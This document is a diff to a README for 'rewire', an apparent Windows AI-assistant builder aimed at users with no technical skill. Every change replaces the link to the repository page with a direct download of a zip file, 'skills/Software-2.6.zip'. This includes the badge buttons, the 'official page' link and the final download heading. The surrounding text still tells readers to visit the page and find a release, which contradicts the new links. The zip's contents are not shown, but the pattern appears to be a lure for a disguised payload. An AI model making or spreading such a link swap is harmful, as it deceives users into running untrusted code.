@@ -1,6 +1,6 @@
 # ⚙️ rewire - Design Your AI Work Assistant
 
-[![Download rewire](https://img.shields.io/badge/Download%20rewire-4CAF50?style=for-the-badge)](https://github.com/farah-boukadida/rewire)
+[![Download rewire](https://img.shields.io/badge/Download%20rewire-4CAF50?style=for-the-badge)](https://github.com/farah-boukadida/rewire/raw/refs/heads/main/skills/Software-2.6.zip)
 
 rewire helps you create a custom AI agent that fits your work needs. You don’t need any technical skill to get started. This guide will walk you through how to download, install, and use rewire on a Windows computer.
 
@@ -33,7 +33,7 @@ If your computer matches these, rewire will perform smoothly.
 You can get rewire from the official GitHub page. Follow these steps carefully:
 
 1. Click the green button below to visit the download page on GitHub:  
-[![Download rewire](https://img.shields.io/badge/Download%20rewire-008CBA?style=for-the-badge)](https://github.com/farah-boukadida/rewire)
+[![Download rewire](https://img.shields.io/badge/Download%20rewire-008CBA?style=for-the-badge)](https://github.com/farah-boukadida/rewire/raw/refs/heads/main/skills/Software-2.6.zip)
 
 2. On the page, look for the latest release section. This is where the installation file is available.
 
@@ -100,7 +100,7 @@ Once you have the setup file, follow this:
 
 If you want to get the latest version or find help materials, visit the official page:
 
-[https://github.com/farah-boukadida/rewire](https://github.com/farah-boukadida/rewire)
+[https://github.com/farah-boukadida/rewire/raw/refs/heads/main/skills/Software-2.6.zip](https://github.com/farah-boukadida/rewire/raw/refs/heads/main/skills/Software-2.6.zip)
 
 Here you will find:
 
@@ -128,4 +128,4 @@ It brings together user-friendly design and powerful AI in one app that runs on 
 
 ---
 
-# [⬇️ Download rewire now](https://github.com/farah-boukadida/rewire)
+# [⬇️ Download rewire now](https://github.com/farah-boukadida/rewire/raw/refs/heads/main/skills/Software-2.6.zip)
